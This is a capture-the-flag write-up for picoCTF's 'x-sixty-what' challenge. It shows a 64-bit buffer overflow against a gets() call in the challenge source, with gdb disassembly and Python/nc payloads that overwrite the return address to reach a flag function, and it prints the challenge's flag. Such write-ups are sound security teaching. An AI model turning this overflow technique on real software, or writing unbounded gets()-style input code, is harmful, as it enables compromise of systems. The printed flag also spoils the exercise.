# x-sixty-what
## Description
Overflow x64 code  
Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the `flag` function in this [program](vuln). [Download source](vuln.c).  
`nc saturn.picoctf.net 50517`
## Hints
1. Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes.
2. Jump to the second instruction (the one after the first `push`) in the `flag` function, if you're getting mysterious segmentation faults.
## Solution
1. This is a straight forward buffer overflow, but 64-bits vs 32-bits.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```
```console
% gdb -q vuln
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x00000000004012b2 <+0>:	endbr64 
   0x00000000004012b6 <+4>:	push   rbp
   0x00000000004012b7 <+5>:	mov    rbp,rsp
   0x00000000004012ba <+8>:	sub    rsp,0x40
   0x00000000004012be <+12>:	lea    rax,[rbp-0x40]
   0x00000000004012c2 <+16>:	mov    rdi,rax
   0x00000000004012c5 <+19>:	mov    eax,0x0
   0x00000000004012ca <+24>:	call   0x401100 <gets@plt>
   0x00000000004012cf <+29>:	nop
   0x00000000004012d0 <+30>:	leave  
   0x00000000004012d1 <+31>:	ret    
End of assembler dump.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010c0  puts@plt
0x00000000004010d0  setresgid@plt
0x00000000004010e0  printf@plt
0x00000000004010f0  fgets@plt
0x0000000000401100  gets@plt
0x0000000000401110  getegid@plt
0x0000000000401120  setvbuf@plt
0x0000000000401130  fopen@plt
0x0000000000401140  exit@plt
0x0000000000401150  _start
0x0000000000401180  _dl_relocate_static_pie
0x0000000000401190  deregister_tm_clones
0x00000000004011c0  register_tm_clones
0x0000000000401200  __do_global_dtors_aux
0x0000000000401230  frame_dummy
0x0000000000401236  flag
0x00000000004012b2  vuln
0x00000000004012d2  main
0x0000000000401340  __libc_csu_init
0x00000000004013b0  __libc_csu_fini
0x00000000004013b8  _fini
```
2. We know the buffer is `64` bytes long and the address of `flag` is `0x401236`. Deliver the payload. Remember, the pushed value of RBP and targeted RIP is 8 bytes vice 4 bytes
```console
% (python -c "print('a'*64 + 'b'*8 + '\x36\x12\x40\x00\x00\x00\x00\x00')"; cat) | nc saturn.picoctf.net 50517
Welcome to 64-bit. Give me a string that gets you the flag: 


```
3. That didn't work. Pay attention to the hint and target `0x40123b`.
```console
(gdb) disas flag
Dump of assembler code for function flag:
   0x0000000000401236 <+0>:	endbr64 
   0x000000000040123a <+4>:	push   rbp
   0x000000000040123b <+5>:	mov    rbp,rsp
   0x000000000040123e <+8>:	sub    rsp,0x50
   0x0000000000401242 <+12>:	lea    rsi,[rip+0xdbf]        # 0x402008
   0x0000000000401249 <+19>:	lea    rdi,[rip+0xdba]        # 0x40200a
   0x0000000000401250 <+26>:	call   0x401130 <fopen@plt>
   0x0000000000401255 <+31>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401259 <+35>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x000000000040125e <+40>:	jne    0x401289 <flag+83>
   0x0000000000401260 <+42>:	lea    rdx,[rip+0xdac]        # 0x402013
   0x0000000000401267 <+49>:	lea    rsi,[rip+0xdba]        # 0x402028
   0x000000000040126e <+56>:	lea    rdi,[rip+0xde8]        # 0x40205d
   0x0000000000401275 <+63>:	mov    eax,0x0
   0x000000000040127a <+68>:	call   0x4010e0 <printf@plt>
   0x000000000040127f <+73>:	mov    edi,0x0
   0x0000000000401284 <+78>:	call   0x401140 <exit@plt>
   0x0000000000401289 <+83>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040128d <+87>:	lea    rax,[rbp-0x50]
   0x0000000000401291 <+91>:	mov    esi,0x40
   0x0000000000401296 <+96>:	mov    rdi,rax
   0x0000000000401299 <+99>:	call   0x4010f0 <fgets@plt>
   0x000000000040129e <+104>:	lea    rax,[rbp-0x50]
   0x00000000004012a2 <+108>:	mov    rdi,rax
   0x00000000004012a5 <+111>:	mov    eax,0x0
   0x00000000004012aa <+116>:	call   0x4010e0 <printf@plt>
   0x00000000004012af <+121>:	nop
   0x00000000004012b0 <+122>:	leave  
   0x00000000004012b1 <+123>:	ret    
End of assembler dump.
```
```console
% (python -c "print('a'*64 + 'b'*8 + '\x3b\x12\x40\x00\x00\x00\x00\x00')"; cat) | nc saturn.picoctf.net 50517
Welcome to 64-bit. Give me a string that gets you the flag: 
picoCTF{b1663r_15_b3773r_964d9987}
```
